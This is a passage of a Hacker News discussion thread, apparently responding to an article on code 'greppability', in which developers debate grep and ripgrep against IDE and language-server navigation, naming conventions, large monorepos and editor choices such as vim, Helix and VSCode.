component and you're using it like this: x-filter-modal Improving the IDE to find one or the other by searching for one or the other is missing the point or the article, that consistency is important. I'd rather have a simple IDE and a good codebase than the opposite. In the example that I gave the worst thing is that it's the framework which forces you do use these two names for the same thing. reply skrebbel 5 hours agorootparentMy point is that if grep tools were more powerful we wouldn't need this very particular kind of consistency, which gives us the very big benefit of being allowed to keep every part of the codebase in its idiomatic naming convention. I didn't miss the point, I disagreed with the point because I think it's a tool problem, not a code problem. I agree with most other points in the article. reply adammarples 8 hours agoparentprevFzf? reply setopt 7 hours agorootparentFuzzy search is not the same. For instance, it might by default match not only “FooBar” and “foo_bar” but also e.g. “FooQux(BarQuux)”, which in a large code base might mean hundreds of false positives. reply mgkimsal 6 hours agorootparentIdeally there'd be some sort of ranking or scoring that would happen to sort by. FooQux(BarQuux) would seemingly rank much lower then FooBar when searching for FooBar or \"Foo Bar\" but might still be useful in results if ranked and displayed lower. reply setopt 5 hours agorootparentIndeed, that's a good solution – and I believe e.g. fzf does some sort of ranking by default. The devil is however in the details: One minor inconvenience is that the scoring should ideally be different per filetype. For instance, Python would count \"foo-bar\" as two symbols (\"foo minus bar\") whereas Lisp would count it was one symbol, and that should ideally result in different scores when searching for \"foobar\" in both. Similarly, foo(bar) should ideally have a lower different score than \"foo_bar\" for symbol search even though the keywords are separated by the same number of characters. I think this can be accomodated by keeping a per-language list of symbols and associated \"penalties\", which can be used to calculate \"how far\" keywords are from each other in the search results weighted by language semantics :) reply lucumo 13 hours agoprevGrepping for symbols like function names and class names feels so anemic compared to using a tool that has a syntactic understanding of the code. Just \"go to definition\" and \"find usages\" alone reduce the need for text search enormously. For the past decade-plus I have mostly only searched for user facing strings. Those have the advantage of being longer, so are more easily searched. Honestly, posts like this sound like the author needs to invest some time in learning about better tools for his language. A good IDE alone will save you so much time. reply laserbeam 10 hours agoparentScenarios where an IDE with full syntactic understanding is better: - It's your day to day project and you expect to be working in it for a long time. Scenarios where grepping is more useful: - Your language has #ifdef or equivalent syntax which does conditional compilation making syntactic tools incomplete. - You just opened the project for the first time. - It's in a language you don't daily drive (you write backend but have to delve in frontend code, it's a 3rd party library, it's configuration files, random json/xml files or data) - You're editing or searching through documentation. - You haven't even downloaded the project and are checking things out in github (or some similar site for your project). - You're providing remote assistance to someone and you are not at your main development machine. - You're remoting via SSH and have access to code there (say it's a python server). Yes, an IDE will save you time daily driving. But there's no reason to sabotage all the other usecases. reply emn13 10 hours agorootparentFurther important (to me) scenarios that also argue for greppability: - greppability does not preclude IDE or language server tooling; there's often special cases where only certain e.g. context-dependant usages matter, and sometimes grep is the easiest way to find those. - projects that include multiple languages, such as for instance the fairly common setup of HTML, JS, CSS, SQL, and some server-side language. - performance in scenarios with huge amounts of code, or where you're searching very often (e.g. in each git commit for some amount of history) - ease of use across repositories (e.g. a client app, a spec, and a server app in separate repos). I treat greppability as an almost universal default. I'd much rather have code in a \"weird\" naming style in some language but have consistent identifiers across languages, than have normal-style-guide default identifiers in each language, but differing identifiers across languages. If code \"looks weird\", if anything that's often actually a _benefit_ in such cases, not a downside - most serialization libraries I use for this kind of stuff tend to do a lot of automagic mapping that can break in ways that are sometimes hard to detect at compile time if somebody renames something, or sometimes even just for a casing change or type change. Having a hint as to this fragility immediate at a glance even in dynamically typed languages is sometimes a nice side-effect. Very speculatively, I wouldn't be surprised if AI coding tools can deal with consistent names better than context-dependent ones too; greppability is likely not specifically about merely the tool grep. And the best part is that there's almost no downside; it's not like you need to pick either a language server, IDE or grep - just use whatever is most convenient for each task. reply lolinder 5 hours agorootparentprev> It's your day to day project and you expect to be working in it for a long time. I don't think we need to restrict the benefits quite that much—if it's a project that isn't my day-to-day but is in a language I already have set up in my IDE, I'd much prefer to open it up in my IDE and use jump to definition and friends than to try to grep and hope that the developers made it grepable. Going further, I'd equally rather have plugins ready to go for every language my company works in and use them for exploring a foreign codebase. The navigation tools all work more or less the same, so it's not like I need to invest effort learning a new tool in order to benefit from navigation. > Yes, an IDE will save you time daily driving. But there's no reason to sabotage all the other usecases. Certainly don't sabotage, but some of these suggestions are bad for other reasons that aren't about grep. For example: breaking the naming conventions of your language in order to avoid remapping is questionable at best. Operating like that binds your business logic way too tightly to the database representation, and while \"just return the db object\" sounds like a good optimization in theory, I've never not regretted having frontend code that assumes it's operating directly on database objects. reply popinman322 10 hours agorootparentprevGrep is also useful when IDE indexing isn't feasible for the entire project. At past employers I worked in monorepos where the sheer size of the index caused multiple seconds of delay in intellisense and UI stuttering; our devex team's preferred approach was to better integrate our IDE experience with the build system such that only symbols in scope of the module you were working on would be loaded. This was usually fine, and it works especially well for product teams, but it's a headache when you're doing cross-cutting work (e.g. for infrastructure projects/overhauls). We also had a livegrep instance that we could use to grep any corporate repo, regardless of where it was hosted. That was extremely useful for investigating failures in build scripts that spanned multiple repositories (e.g. building a Go sidecar that relies on a service config in the Java monorepo). reply cma 6 hours agorootparentIf running into this, make sure to enable 64-bit intellisense and increase the ram limit, by default it is 4gb. reply jollyllama 6 hours agorootparentprev>It's your day to day project and you expect to be working in it for a long time. Bold of everyone here to assume that everyone has a day to day project. If you're a consultant or for other reasons you're switching projects on a month to month basis, greppability is probably the top metric second to UT coverage. reply switchbak 2 hours agorootparentThey said the scenario in which that would be useful was IF: \"It's your day to day project and you expect to be working in it for a long time\". The implication being that if neither of those hold then skip to the next section. I don't think anyone is assuming anything here. I've contracted for most of my career and this didn't seem like an outlandish statement. Also, if you're working in a project for a month, odds are you could set up an IDE in the first few hours. Not sure how any of this rises to the level of being \"bold\". reply cxr 6 hours agorootparentprev- You're fully aware that it would be better to be able to use tooling for $THING, but tooling doesn't exist yet or is immature. reply kragen 5 hours agorootparentyou would not believe the amount of time i spent pretty-printing python dicts by hand last week reply yen223 4 hours agorootparenthttps://docs.python.org/3/library/pprint.html reply kragen 4 hours agorootparentyeah, pprint is why i was doing it by hand ;) reply lkbm 3 hours agorootparentI used to pipe things through black for that. (a script that imported black, not just black on the command line.) I also had `j2p` and `p2j` that would convert between python (formatted via black) and json (formatted via jq), and the `j2p_clip`/`p2j_clip` versions that would pipe from clipboard and back into clipboards. It's worth taking the time to build a few simple scripts for things you do a lot. I used to open up the repl and import json to convert between json and python dicts multiple times a day, so spending a few minutes throwing together a simple script to do it was well worth the effort. reply joe-six-pack 5 hours agorootparentprevYou forgot massive codebases. Language servers really struggle with anything on the order of the Linux kernel, FreeBSD, or Chromium. reply Groxx 50 minutes agorootparentI honestly suspect that the amount of time spent dealing with the issues monorepos cause is net-larger than the gains most get from what a monorepo offers. It's just harder to measure because it tends to degrade slowly, happen to things you didn't realize you were relying on (until you need them), and without clear ways to point fingers at the cause. Plus it means your engs don't learn how to deal with open source code concerns, e.g. libraries, forking, dependency management. Which gradually screws over the whole ecosystem. If you're willing to put Google-scale effort into building your tooling, sure. Every problem is solvable. Only Google does that though, everyone else is getting by with a tiny fraction of the resources and doesn't already have a solid foundation to reduce those maintenance costs. reply umanwizard 2 hours agorootparentprevclangd works fine for me with the linux kernel. For best results build the kernel with clang by setting LLVM=1 and KERNEL_LLVM=1 in the build environment and run ./scripts/clang-tools/gen_compile_commands.py after building. reply umanwizard 2 hours agorootparentprev> Your language has #ifdef or equivalent syntax which does conditional compilation making syntactic tools incomplete. Your other points make sense, but in this case, at least for C/C++, you can generate a compile_commands.json that will let clangd interpret your code accurately. If building with make just do `bear -- make` instead of `make`. If building with cmake pass `-DCMAKE_EXPORT_COMPILE_COMMANDS=1`. reply camel-cdr 1 hour agorootparentDoes it evaluate macros? Because macros allow for arbitrary computation. reply umanwizard 41 minutes agorootparentThe macros I see in the real world seem to usually work fine. I’m sure it’s not perfect and you can construct a macro that would confuse it, but it’s a lot better than not having a compilation db at all. reply gpderetta 5 hours agorootparentprev- you just switched branch/rebased and the index is not up to date. - the project is large enough that the IDE can't cope. - you want to also match comments, commented out code or in-project documentation - you want fuzzy search and match similarly named functions I use clangd integration in my IDE all the time, but often brute force is the right solution. reply gregjor 9 hours agoparentprevI abandoned VSCode and went back to vim + ctags + ripgrep after a year with the most popular IDE. I miss some features but it didn’t give me a 10x or even 1.5x improvement in my own work along any dimension. I attribute that mostly to my several decades of experience with vi(m) and command line tools, not to anything inherently bad about VSCode. What counts as “better” tools has a lot of subjectivity and circumstances implied. No one set of tools works for everyone. I very often have to work over ssh on servers that don’t allow installing anything, much less Node and npm for VSCode, so I invest my time in the tools that always work everywhere, for the work I do. The main project I’ve worked on for the last few years has a little less than 500,000 lines of code. VSCode’s LSP takes a few seconds fairly often to maintain the LSP indexes. Running ctags over the same code takes about a second and I can control when that happens. vim has no delays at all, and ripgrep can search all of the files in a second or two. reply joe-six-pack 5 hours agorootparentVSCode is not an IDE, it's an extensible text editor. IDEs are integrated (it's in the name) and get developed as a whole. I'm 99% certain that if you were forced to spend a couple of months in a real IDE (like IDEA or Rider), you would not want to go back to vim, or any other text editor. Speaking as a long time user of both. reply gregjor 3 hours agorootparentI get your point, but VSCode does far more than text editing. The line between an advanced editor and an IDE gets blurry. If you look at the Wikipedia page about IDEs[1] you see that VSCode ticks off more boxes than not. It has integration with source code control, refactoring, a debugger, etc. With the right combination of extensions it gets really close to an IDE as strictly defined. These days advanced text editor vs. \"real\" IDE seems more like a distinction without much of a difference. You may feel 99% certain, but you got it wrong. I have quite a bit of experience with IDEs, you shouldn't assume I use vim out of ignorance. I have worked as a programmer for 40+ years, with development tools (integrated or not) that I have forgotten the names of. That includes \"real\" IDEs like Visual Studio, Metrowerks CodeWarrior, Symantec Think C, MPW, Oracle SQL Developer, Turbo Pascal, XCode, etc. and so on. When I started programming every mainframe and minicomputer came with an IDE for the platform. Unix came along with the tools broken out after I had worked for several years. In high school I learned programming on an HP-2000 BASIC minicomputer -- an IDE. So I have spent more than \"a couple of months in real IDEs\" and I still use vim day to day. If I went back to C++ or C# for Windows I would use Visual Studio, but I don't do that anymore. For the kind of work I do now vim + ctags + ripgrep (and awk, sed, bash, etc.) get my work done. At my very first real job I used PWB/Unix[2] -- PWB means Programmer's Work Bench -- an IDE of sorts. I still use the same tools (on Linux) because they work and I can always count on finding a large subset of them on any server I have to work with. I don't dislike or mean to crap on IDEs. I have used my share of IDEs and would again if the work called for that. I get what I need from the tools I've chosen, other people make different choices, no perfect language, editor, IDE, what have you exists. [1] https://en.wikipedia.org/wiki/Integrated_development_environ... [2] https://en.wikipedia.org/wiki/PWB/UNIX reply wrasee 9 hours agorootparentprevDid you consider Neovim? You get the benefit of vim while also being able to mix in as much LSP tooling as you like. The tradeoff is that it takes some time to set up, although that is getting easier. That won’t make LSP go any faster though. There’s still something interesting in the fact that a ripgrep of every line in the codebase can still be faster than a dedicated tool. reply gregjor 8 hours agorootparentConsidered it and have tried repeatedly to get it to work with mixed success. As you wrote, it takes \"some time\" to set up. In my case it would only offer marginal improvements over plain vim, since I'm not that interested in the LSP integration (and vim has that too, through a plugin). In the environments I often work in I can't install anything or run processes like node. I ssh into a server and have to use whatever came with the Linux distro, which means sticking with the tools I will find everywhere. I can't copy the code from the server either. If I get lucky they used version control. I know not everyone works with those constraints. I specialize in working on abandoned and legacy code. reply wrasee 8 hours agorootparentYes ok. And legacy code might be a good example where grep works well, if it's fair to argue a greater propensity for things like preprocessors, older languages and custom builds that may not play as well with semantic-level tools, let alone be written with modern tooling in mind. reply gregjor 5 hours agorootparentLol, I'm not working with COBOL or Fortran. Legacy code in my world means the original developers have left, not that it dates from the 1970s. Mostly I work with PHP, shell scripts, various flavors of SQL, Python, sometimes Rails or other stuff. All things modern LSPs can handle. reply kragen 5 hours agorootparentprevcan you not upload executables over ssh, say for policy reasons or disk-space reasons? how about shell scripts? i mean, i doubt i'm going to come up with some brilliant breakthrough that makes your life easier that you've somehow overlooked, but i'd like to understand what kinds of constraints people like you often confront i'm just glad you don't have to use teamviewer reply gregjor 3 hours agorootparentI don't have to use TeamViewer, though I very occasionally have to use Windows RDP. You can transfer any kind of file over ssh. scp, sftp, rsync will all copy binaries. Mainly the issues come down to policy and billable time. Many of my customers simply don't allow installing anything on their servers without a tedious approval process. Even if I can install things I might spin my wheels trying to get it to work in an environment I don't have root privileges on, with no one willing to help, and I can't bill for that time. I don't work for free to get an editor installed. I use the tools I know I can find on any Linux/BSD server. With some customers I have root privileges and manage the server for them. With others their IT dept has rules I have to follow (I freelance) if I want to keep a good relationship. Since I juggle multiple customers and environments I find it simpler not having to manage different editors and environments, so I mostly stick with the defaults. I do have a .profile and .vimrc I copy around if allowed to, that's about it. I can't lose time/money and possibly goodwill whining about not having everything just-so for me. I recently worked on a server over ssh that didn't have tmux installed. Fortunately it did have screen, and I can use that too, no big deal. I spent less than 60 seconds figuring that out and getting to work rather than wasting hours of non-billable time annoying someone about how I needed tmux installed. reply kragen 3 hours agorootparenti see, thanks! wrt rdp, i feel like rdp is actually better than vnc or x11-over-ssh, but for cases where regular ssh works, i'd rather use ssh i wasn't thinking in terms of installing tmux, more like a self-contained binary that doesn't require any kind of 'installation' reply gregjor 3 hours agorootparentI used the word \"install\" but the usual rule says I can't install, upload, or execute any non-approved software. Usually that just gets stated as a policy, but I have seen Linux home directories on noexec partitions -- government agencies and big corporations can get very strict about that. So copying a self-contained binary up and running it would violate the policy. I pretty much live in ssh. Remote Desktop means a lot of clicking and watching a GUI visibly repaint. Not efficient. Every so often I have customers using applications that only run on Windows, no API, no command line, so they will enable RDP to that, usually through a VPN. reply kragen 2 hours agorootparenti see! but i guess your .profile and .vimrc don't count? reply gregjor 2 hours agorootparentThey aren't executables. reply kragen 21 minutes agorootparentmy cousin wrote a vt52 emulator in bash, and i was looking at a macro assembler written in bash. i haven't seen a cscope written in bash, but you probably remember how the first versions of ctags were written in sh (or csh?) and ed. so there's not much limit to how far shell functions can go in augmenting your programming environment if awk, python, or perl is accepted, the possibilities expand further VHRanger 7 hours agorootparentprevThere's also helix now, which requires next to no setup, but requires learning new motions (subject is before the verb in helix) reply gregjor 5 hours agorootparentI looked at Helix but since I dream in vim motions at this point (vi user since it came out) I'd have to see a 10x improvement to switch. VSCode didn't give me a 10X improvement, I doubt Helix would. reply VHRanger 4 hours agorootparentHelix certainly won't give you a 10x improvement. It tends to convert a lot of people moving \"up\" from VS Code, and still a decent chunk, but certainly fewer neovim users moving \"down\". Advantages of Helix are pretty straightforward: 1. Very little configuration bullshit to deal with. There's not even a plugin system yet! You just paste your favorite config file and language/LSP config file and you're good to go. For anything else, submit a pull request. 2. Built in LSP support for basically anything an LSP exists for. 3. There's a bit of a new generation command line IDE forming itself around zellij (tmux that doesn't suck) + helix + yazi (basically nnn or mc on crack, highly recommended). That whole zellij+helix+yazi environment is frankly a joy to work in, and might be the 2-3x improvement over neovim that makes the switch worth it. reply gregjor 3 hours agorootparentLike I wrote, I looked at Helix. Seems cool but not enough for me to switch. And I would have to install it on the machines I work on, which very often I can't do because of company policies, or can't waste the non-billable time on. I only recently moved from screen to tmux, and I still have to fall back to screen sometimes because tmux doesn't come with every Linux distro. I expect I will retire before I think tmux (or screen, for that matter) \"sucks\" to the point I would look at something else. And again I very often can't install things on customer servers anyway. reply VHRanger 1 hour agorootparentTmux does suck pretty bad though? It conflicts with the clipboard and a bunch of hotkeys, and configuring it never works because they have breaking change in how their config file works ever 6months or so. These days I only use it to launch a long running job in ssh to detach the session it's on and leave. reply heisenbit 12 hours agoparentprevA good IDE can be so much better iff it understands the code. However this requires the IDE to be able to understand the project structure, dependencies etc. which can be considerable effort. In a codebase with many projects employing several different languages it becomes hard to get and maintain the IDE understands everything state. reply amichal 11 hours agorootparentAnd an IDE would also fail to find references for most of the cases described in the article: name composition/manipulation, naming consistency across language barriers, and flat namespaces in serialization. And file/path folder naming seems to be irrelevant to the smart IDE argument. \"Naming things is hard\" reply carlmr 10 hours agorootparentprevAnd especially in large monorepos anything that understands the code can become quite sluggish. While ripgrep remains fast. A kind of in-between I've found for some search and replace action is comby (https://comby.dev/). Having a matching braces feature is a godsend for doing some kind of replacements properly. reply brain5ide 12 hours agoparentprevI think the first sentence of the author counters your comment. What you described works best in a familiar codebase where the organizing principles have been maintained well and are familiar to the reader and the tools are just the extension of those organizing principles. Even then a deviation from those rules might produce gaps in understanding of what the codebase does. And grep cuts right through that in a pretty universal way. What the post describes are just ways to not work against grep to optimize for something ephemeral. reply ricardo81 12 hours agorootparentAgree. Not just because it's unfamiliar code, you can also get a feel for how the program/programmer(s) structured the whole thing. reply citrin_ru 11 hours agoparentprevNot everything you need to look for is a language identifier. I often grep for configuration option names in the code to see what the option actually does - sometimes it is easy to grep, sometimes there are too many matches, sometimes they cannot be found because option name composed in the code from separate unrepeatable (because of too many matches) parts. It's not hard to make config options greppable but some coders just don't care about this property. reply zarzavat 12 hours agoparentprevGo to definition and find usages only work one symbol at a time. I use both, but I still use global find/replace for groups of symbols sharing the same concept. For example if I want to rename all “Dog” (DogModel, DogView, DogController) symbols to “Wolf”, find/replace is much better at that because it will tell me about symbols I had forgotten about. reply sandermvanvliet 10 hours agorootparentJetbrains ReSharper (and Rider) is smart enough to handle these things. It’ll suggest renames across other symbols even ones that have related names reply f1shy 12 hours agorootparentprevFor that use case I think you can use treesitter[1] you can find Dog.* but only if it is a variable name, for example. Avoiding replacement inside of say literals. [1] https://www.youtube.com/watch?v=MZPR_SC9LzE reply turboponyy 12 hours agorootparentprevThere's no reason they have to work one symbol at a time - that's just a missing feature in your language server implementation. Some language servers support modifying the symbols in contexts like docstrings as well. reply setopt 12 hours agorootparentI’ve never seen an LSP server that lets you rename “Dog” to “Wolf” where your actual class names are “Dog[A-Za-z]*”? Do you have an example? reply turboponyy 10 hours agorootparentNeither have I; and no, I don't - I misinterpreted what you said. But I don't see why LSP servers shouldn't support this, still. I'm not sure if the LSP specification allows for this as of current, though. reply setopt 2 hours agorootparentI would actually love a regexp search-and-replace assisted by either TreeSitter or LSP. Something that lets me say that I want to replace “Dog\\(.*\\)” with “Wolf\\1”, but where each substitution is performed only within single “symbols” as identified by TS or LSP. reply Maxion 11 hours agorootparentprevIntelliJ's refactor tool? reply yen223 4 hours agorootparentIntelliJ doesn't use LSP as far as I know. It does usually make that kind of DogModel -> WolfModel refactoring. reply gugagore 12 hours agorootparentprevI am familiar with the situation you describe, and it's a good point. However, it does suggest that there is an opportunity for factoring \"Dog\" out in the code, at least by name spacing (e.g. Dog.Model). reply zarzavat 10 hours agorootparentThat gets to the core of the issue doesn’t it? There are two cultures: Do you prefer to refactor DogView into Dog.View, or do you prefer to refactor Dog.View into DogView. Personally I value uniqueness/canonicalness over conciseness. I would rather have DogView because then there is one name for the symbol regardless of where I am in the codebase. If the same symbol is used with differently qualified names it is confusing - I want the least qualified name to be more descriptive than “View”. The other culture is to lean heavily on namespaces and to not worry about uniqueness. In this case you have View and Dog.View that may be used interchangeably in different files. This is the dominant culture in Java and C#. reply kccqzy 5 hours agorootparentThe second culture that you describe happens also to be how OCaml structures things in modules. It's quite a turnoff for me. reply f1shy 12 hours agorootparentprevThat really depends on the context, and specific situation. reply jmmv 1 hour agoparentprevSure, if you have the luxury of having a functional IDE for all of your code. You can't imagine how much faster I was than everybody else at answering questions about a large codebase just because I knew how to use ripgrep (on Windows). \"Knowing how to grep\" is a superpower. reply sauercrowd 8 hours agoparentprevstrongly disagree here. This works if - your IDE/language server is performant - all the tools are fully set up - you know how to query the specific semantic entity you're looking for (remembering shortcuts) - you are only interested in a single specific semantic entity - mixing entities is rarely supported I dont map out projects in terms of semantics, I map out projects in files and code - That makes querying intuitive and I can easily compose queries that match the specificity of what I care about (e.g. I might want to find a `Server` but I want to show both classes, interfaces and abstract classes). For the specific toolchain I'm using - typescript - the symbol search is also unusable once it hits a certain project size, it's just way too slow for it to be part of my core workflow reply brooke2k 1 hour agoparentprevwith all due respect, it sounds like you have the privilege of working in some relatively tidy codebases (and I'm jealous!) with a legacy codebase, or a fork of a dependency that had to be patched which uses an incompatible buildsystem, or any C/C++/obj-c/etc that heavily uses the preprocessor or nonstandard build practices, or codebases that mix lots of different languages over awkward FFI boundaries and so on and so forth -- there are so many situations where sometimes an IDE just can't get you 100% of the way there and you have to revert to grepping to do any real work that being said, I don't fully support the idea of handcuffing your code in the name of greppability, but I think dismissing it as a metric under the premise that IDEs make grepping \"obsolete\" is a little bit hasty reply lucumo 55 minutes agorootparent> with all due respect, it sounds like you have the privilege of working in some relatively tidy codebases (and I'm jealous!) I wish, but no. I've found people will make a mess of everything. Which is why I don't trust solutions that rely on humans having more discipline, like what this article advocates. In any situation where grep is your last saviour, you cannot rely on the greppability of the code. You'll have to check and double check everything, and still accept the risk of errors. reply underdeserver 12 hours agoparentprevUnfortunately in larger codebases or dynamic languages these tools are just not good enough today. At least not those I and my employers have tried. They're either incomplete (you don't get ALL references or you get false references) or way too slow (>10 seconds when rg takes 1-2). Recommendations are most welcome. reply jimmaswell 12 hours agorootparentOnly thing I can recommend is using C# (obviously not always possible). Never had an issue with these functions in Visual Studio proper no matter how big the project. reply leni536 11 hours agoparentprevI can't use an IDE on my entire git history, but git can grep. reply db48x 7 hours agoparentprevTrue, but IDEs are fragile tools. Sometimes you want to fall back to simpler tools that will always work, and grep is not fragile. reply cxr 6 hours agorootparentThe basis if this article (and its forebear \"Too DRY - The Grep Test\"[1]) is that grep is fragile. It's just fragile in a way that's different from the way that IDEs are fragile. 1.reply a_e_k 11 hours agoparentprevI've come to really like language servers for big personal and work projects where I already have my tools configured and tuned for efficiently working with it. But being able to grep is really nice when trying to figure out something out about a source tree that I don't yet have set up to compile, nor am I a developer of. I.e., I've downloaded the source for a tool I've been using pre-built binaries of and am now trying to trace why I might be getting a particular error. reply phyrex 9 hours agoparentprevThis breaks down at scale and across languages. All the FAANGs make heavy use of the equivalent of grepping in their code base reply EasyMark 5 hours agoparentprevIt seems like the law of diminishing returns; while I'm sure in a few cases this characteristic of a code writing style is extremely useful, it cuts into other things such as readability and conciseness. Fewer lines can mean fewer bugs, within reason, if you aren't in lisp and are using more than 3 parentheses, you might want to split it up because the compiler/JIT/interpreter is going to anyway. reply mjr00 6 hours agoparentprev> Honestly, posts like this sound like the author needs to invest some time in learning about better tools for his language. A good IDE alone will save you so much time. Completely agreed. The React component example in the article is trivial solvable with any modern IDE; right click on class name, \"Find Usages\" (or use the appropriate hotkey, of course). Trying to grep for a class name when you could just do that is insane. I mainly see this from juniors who don't know any better, but as seen in this thread and the article, there are also experienced engineers who are stubborn and refuse to use tools made after 1990 for some reason. reply gpderetta 4 hours agorootparentI worked on codebases large enough where enabling autocomplete/indexing would lock the IDE and cause the workstation to swap hard. reply k__ 11 hours agoparentprevHonestly, in my 18 years of software development, I haven't \"greped\" code once. I only use grep to filter the output of CLI tools. For code, I use my IDE or repository features. reply kragen 7 hours agoparentprevposts like this sound like the author routinely solves harder problems than you are, because the solutions you suggest don't work in the cases the post is about. we've had 'go to definition' since 01978 and 'find usages' since 01980, and you should definitely use them for the cases where they work reply mjr00 6 hours agorootparentFrom the article, - dynamically built identifiers is 100% correct, never do this. Breaks both text search and symbol search, results in complete garbage code. I had to deal with bugs in early versions of docker-compose because of this. - same name for things across the stack? Shouldn't matter, just use find usages on `getAddressById`. Also easy way to bait yourself because database fields aren't 1:1 with front-end fields in anything but the simplest of CRUD webshit. - translation example: the fundamental problem is using strings as keys when they should be symbols. Flat vs nested is irrelevant here because you should be using neither. - react component example: As I mentioned in another comment, trivially managed with Find Usages. Nothing in here strikes me as \"routinely solves harder problems,\" it's just standard web dev. reply kragen 5 hours agorootparentyes, i agree that standard web dev is full of these problems, which can't be solved with go-to-definition and find-usages. it's a mess. i wasn't claiming that these messy, hard problems where grep is more helpful than etags are exotic; they are in fact very common. they are harder than the problems lucumo is evidently accustomed to dealing with because they don't have correct, complete solutions, so we have to make do with heuristics advice to the effect of 'you should not make a mess' is obviously correct but also, in many situations, unhelpful. sometimes i'm not smart enough to figure out how to solve a problem without making a mess, and sometimes i inherit other people's messes. in those situations that advice decays into 'you should not try to solve hard problems' reply lucumo 3 minutes agorootparent> they are harder than the problems lucumo is evidently accustomed to dealing with because they don't have correct, complete solutions, so we have to make do with heuristics Funny. But since you asked. The hardest problems I've solved haven't been technical problems for years. Not that I stopped solving technical problems, or that I started solving only the easier problems. I just learned to solve people problems more. People problems are much harder than technical problems. The author showed a simple people problem: someone who needs to know about better tooling. If we were working together, showing them some tricks wouldn't take much time and would improve their productivity. An example of a harder problem is when someone tries to play aggressive little word games with you. For example, trying to put you down by loudly making assumptions about your career and skills. One way to deal with that is to just laugh it off. Maybe even make a self-deprecating joke. And then continuing as if nothing happened. But that assumes you want or have to continue working productively with them. If you don't, it can be quite enjoyable to just laugh in their face. After all, it's never the sharpest tool in the shed, or the brightest light that does that. In fact, it's usually the least useful person around, who is just trying to hide that fact. Of course, once you realize that, it becomes hard to laugh, because it's no longer funny. Just sad and pitiful. reply PhilipRoman 10 hours agoparentprevIDEs are cool and all, but there is no way I'm gonna let VSCode index my 80GB yocto tmp directory. Ctags can crunch the whole thing in a few minutes, and so can grep. Plus there are cases where grep is really what you need, for example after updating a particular command line tool whose output changed, I was able to find all scripts which grepped the output of the tool in a way that was broken. reply hyperpape 7 hours agoparentprevI can run rg over my project faster than I can do anything in my IDE. Both tools have their places. reply IshKebab 12 hours agoparentprevDefinitely true when you can use static typing. Unfortunately sometimes you can't, and sometimes you can but people can't be arsed, so this is still a consideration. reply aa-jv 12 hours agoparentprevOn the flipside, IDE's can turn you into lazy, inefficient programmers by doing all the hand-holding for you. If your feelings are anemic when tasked with doing a grep, its because you have lost a very valuable skill by delegating it to a computer. There are some things the IDE is never going to be able to find - lest it becomes the development environment - so keeping your grep fu sharpened is wise beyond the decades. (Disclaimer: 40 years of software development, and vim+cscope+grep/silversearcher are all I really need, next to my compiler..) reply throwaway2037 8 hours agorootparent> lazy... programmers Since when was that a bad thing? Since time immemorial, it has been hailed as a universal good for programmers to be lazy. I'm pretty sure Larry Wall has lots of jokes about this on Usenet. Also, I can clearly remember switching from vim/emacs to Microsoft Visual Studio (please, don't throw your tomatoes just yet!). I was blown away by IntelliSense. Suddenly, I was focusing more on writing business logic, and less time searching for APIs. reply trashtester 8 hours agorootparentThis is the wrong type of lazy. Command line tools like grep are force multipliers for programmers. GUI's come with the risk of not being able to learn how to leverage this power. In the end, that often leads to more manual work. And today, bash is a lingua franca that you can bring with you almost everywhere. Even Windows \"speaks\" bash these days, with WSL. In itself, there's nothing wrong with using the built-in features of a GUI. Right-clicking a method (or using a keyboard shortcut) to find the definition in a given code base IS nice for that particular operation. But by knowing grep/awk/find/git command line and so on, combined with bash scripting and advanced regular expressions, you open up a new world of possibilities. All those things CAN be done using Python/C#/Java or whatever your language is. But a 1-liner in bash can be 10-100 lines of C#. reply lucumo 6 hours agorootparentWhere does this stupid notion come from that using powerful tools means you can't handle the less powerful ones anymore? Did your skills with a hand screwdriver atrophy when you learned how to use a powered screwdriver? Come on. I use grep multiple times a day. I write bash scripts quite often. I'm not speaking from a position of ignorance of these tools. They have their place as a lowest common denominator of programming tools. But settling for the lowest common denominator is not a path to productivity. Doesn't mean you should forget your skills, but it does mean you should investigate better tools. And leverage them. A lot. > But a 1-liner in bash can be 10-100 lines of C#. Yes. And the reverse is also true. bash is fast and easy if there's an existing tool you can leverage, and slow and hard when there's not. reply winwang 10 hours agorootparentprevI count the IDE and stuff like LSP as natural extensions of the compiler. For sure I grep (or equivalent) for stuff, but I highly prefer statically typed languages/ecosystems. At the end of the day, I'm here to solve problems, and there's no end to them -- might as well get a head start. reply lucumo 8 hours agorootparentprev> If your feelings are anemic I'm not feeling anemic. The tool is anemic, as in, underpowered. It returns crap you don't want, and doesn't return stuff you do want. My grep-fu is fine. It's a perfectly good tool if you have nothing better. But usually you do have something better. Using the wrong tool to make yourself feel cool is stupid. Using the wrong tool because a good tool could make you lazy shows a lack of respect for the end result. reply high_na_euv 9 hours agorootparentprevLeveraging technology is good thing reply HdS84 11 hours agorootparentprevHuh? I have an old hand-powered drill from my Grandpa in my workshop. I used it once for fun. For all other tasks I use a powered drill. Same for IDEs. They help your refactor and reason about code - both properties I value. Sure, I could print it and use a textmarker, but I'm not Grandpa reply trashtester 8 hours agorootparentKnowing the bash ecosystem translates better to how you use the knife in the kitchen. Sure you can replace most uses of a knife with power tools, but there is a reason why most top chefs still rely on that knife for most of those tasks. A hand powered drill is more like a hand powered meatgrinder. It has the same limitation as the powered versions, and is simply a more primitive version. reply jakub_g 13 hours agoparentprevYour observation does not help with the majority of the points in the article. How do you find all usages of a parameter value literal? reply CrimsonRain 8 hours agorootparentBy not using literals everywhere. All literals are defined somewhere (start of function, class etc) as enums or vars and used. Just because I have 20 usage of 'shipping_address' doesn't mean I'll have this string 20 times in different places. Grep has its place and I often need to grep code base which have been written without much thoughts towards DX. But writing it nicely allows LSP to take over. reply troupo 12 hours agorootparentprevThis is what the article starts with: \"Even in projects exclusively written by myself, I have to search a lot: function names, error messages, class names, that kind of thing.\" All of that is trivial to search for with a tool that understands the language. reply nosianu 12 hours agorootparent> All of that is trivial to search for with a tool that understands the language. Isn't string search, or grepping for patterns, even more trivial? So what is your argument? You found an alternative method, good, but how is it any better? In my own case, I wrote a library that we used in many projects, and I often wanted to know where and how functions from my lib were used in those projects. For example, to be able to tell how much of an effort it would be for the users to refactor when I changed something. However, your method of choice at least with my IDE (Webstorm) only worked locally within the project. Only string search would let me reliably and easily search all projects. I actually experimented creating a \"meta\" project of all projects, but while it worked that lead to too many problems, and the main method to find anything still was string search (CTRL-SHIFT-F Find dialog in IDEA IDEs is string search and it's a wonderful dialog in that IDE family). I also had to open that meta project. Instead, I created a gitignored folder with symlinks to the sources of all the other projects and created a search scope for that folder, in which the search dialog let me string-search all projects' sources at once right from within the library project and still being able to use the excellent Find dialog. In addition, I found that sometimes the IDE would not find a usage even within the project. 